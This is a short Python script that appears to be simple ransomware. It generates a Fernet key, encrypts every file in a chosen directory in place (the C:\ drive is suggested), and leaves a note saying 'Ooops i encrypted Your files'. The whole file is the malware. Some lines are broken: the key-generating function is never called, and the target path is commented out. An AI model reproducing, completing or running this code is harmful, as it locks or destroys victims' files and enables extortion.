from cryptography.fernet import Fernet
import os

def gen_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:

        key_file.write(key)
def crg_key():
    return open('key.key', 'rb').read()

def encryptFiles(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':
    #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    #UNCOMMENT FOR USAGE//path_to_encrypt = 'C:\\' 
    #path to directory u wanna encrypt.Currently located in C: drive.
    
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '\\' + item for item in items]
    gen_key
    key = crg_key()

    encryptFiles(full_path, key)
    
    with open(path_to_encrypt + '\\' + 'readme.txt', 'w') as file:
        file.write('Ooops i encrypted Your files:#')
        file.write('Have a nice day!')
